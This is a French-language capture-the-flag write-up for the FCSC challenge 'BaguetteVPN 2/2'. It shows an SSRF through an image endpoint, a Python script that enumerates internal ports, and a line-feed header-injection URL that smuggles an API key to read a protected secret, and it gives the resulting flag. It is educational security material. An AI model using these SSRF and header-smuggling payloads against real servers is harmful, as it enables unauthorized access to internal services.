# BaguetteVPN 2/2
<img src="https://user-images.githubusercontent.com/74382279/117364841-b2b29780-aebe-11eb-9e7f-52f116bab774.png"/><br/>
## Résolution
C'est la partie la plus compliquée du challenge.<br/>
Pour commencer, brêve analyse du fichier ```./baguettevpn_server_app_v0.py```.<br/>
Cette fonction devrait nous print le flag:<br/>
```py
@app.route("/api/secret")
def admin():
    if request.remote_addr == '127.0.0.1':
        if request.headers.get('X-API-KEY') == 'b99cc420eb25205168e83190bae48a12':
            return jsonify({"secret": os.getenv('FLAG')})
        return Response('Interdit: mauvaise clé d\'API', status=403)
    return Response('Interdit: mauvaise adresse IP', status=403)
```
Cependant, on est confronté face à plusieurs conditions.<br/>
On doit trouver un moyen de requêter à travers le serveur, on s'attend donc à exploiter une faille de type SSRF.<br/>
On s'attaquera à la deuxième condition plus tard.<br/>
## SSRF
En fouillant le site, j'apperçois un point d'injection pottentiellement vulnérable à une SSRF.<br/>
Le paramètre ```/api/image?fn=``` permet de read des fichiers internes.<br/>
Je décide donc d'exploiter ce paramètre, en me munissant de ce cheatsheet plutôt complet: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">Link</a>.<br/>
En premier temps j'essaye  ```/api/image?fn=127.0.0.1```.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/839960727799595079/unknown.png?width=1440&height=323"/><br/>
Malheureusement la requête ne passe pas, j'ajoute donc un ```@``` pour bypass les weak parsers.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/840212540935110706/unknown.png?width=1440&height=335"/><br/>
Malheureusement, toujours rien.<br/>
En lisant l'énoncé du challenge je vois qu'une énumération des ports inférieurs à 2000 est autorisée.<br/>
Je fais donc la même chose en gardant la même injection ```/api/image?fn=@127.0.0.1:[port]``` et en énumérant les ports.<br/>
Pour ce faire, j'ai fait un script afin d'automatiser tout ça.<br/>
```py
import requests as r

if __name__ == "__main__":
	with r.session() as s:
		for i in range(0, 2000 + 1):
			response = s.get("http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=@127.0.0.1:%s" % (str(i)))
			if "Internal Server Error" not in response.text:
				print(response.url)
```
Après quelques minutes je vois que le port ```1337``` a été match.<br/>
Je me rends donc à ```http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=@127.0.0.1:1337```.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/839958634514612284/unknown.png?width=1440&height=490"/><br/><br/>
Good, on est sur la bonne voie.<br/>
Je me rends à la path ```/api/secret``` et je vois que requête passe bien localement.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/839959391415697428/unknown.png?width=1440&height=462"/><br/><br/>
Première condition validée, on passe donc à la deuxième condition.<br/>
## HTTP Request Smuggling
```py
if request.headers.get('X-API-KEY') == 'b99cc420eb25205168e83190bae48a12'
```
On doit trouver un moyen d'utiliser des headers dans l'URL.<br/>
A ce moment-là, j'ai immédiatement su qu'il s'agissait d'une faille de type HTTP Request Smuggling.<br/>
Dans ce genre de situations, il y a 3 types d'acteurs:<br/>
**• L'attaquant**<br/>
**• Le proxy/firewall**<br/>
**• Le serveur web**<br/>
Cette faille a beaucoup de variantes, généralement elle surgit de cette manière:<br/>
**• L'attaquant se connecte au proxy, il envoie ABC**<br/>
**• Le proxy l'interprète comme AB, C, et le rédirige vers le serveur**<br/>
**• Le serveur web l'interprète comme A, BC, et répond avec r(A), r(BC)**<br/>
**• Proxy caches r(A) pour AB, r(BC) pour C**<br/>
La première chose que je fais c'est ajouter ```HTTP/1.1``` dans l'URL.<br/>
J'obtiens une erreur de parsing plutôt intéressante:<br/>
```PHP
Error response
Error code: 400

Message: Bad request syntax ('GET /api/secret HTTP/1.1 HTTP/1.1').

Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.
```
Je constate que le ```HTTP/1.1``` a bien été ajouté dans le corps de la requête.<br/>
Mon idée consitait à retaper le corps de la requête directement dans l'URL, en faisant attention aux sauts de ligne (Line feed).<br/>
J'ai donc tenté de push le header ```X-API-KEY``` en ajoutant le ```%0a``` (```\n```).<br/>
```http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=@127.0.0.1:1337/api/secret+HTTP/1.1%0aX-API-KEY:b99cc420eb25205168e83190bae48a12```<br/>
Aucun résultat, je suppose qu'il y a un header ```Content-Length``` initialisé à 0 qui bloque la requête.<br/>
Je calcule la taille de la clé ```X-API-KEY```.<br/>
```py
>>> print(len("b99cc420eb25205168e83190bae48a12"))
32
```
J'ajoute le header ```Content-Length``` avec la taille de la clé (```32```).<br/>
```http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=@127.0.0.1:1337/api/secret+HTTP/1.1%0aX-API-KEY:b99cc420eb25205168e83190bae48a12%0aContent-length:32```<br/>
```json
{"secret":"FCSC{6e86560231bae31b04948823e8d56fac5f1704aaeecf72b0c03bfe742d59fdfb}"}
```
Done.<br/>
### Sources
https://bugs.php.net/bug.php?id=80043&edit=1
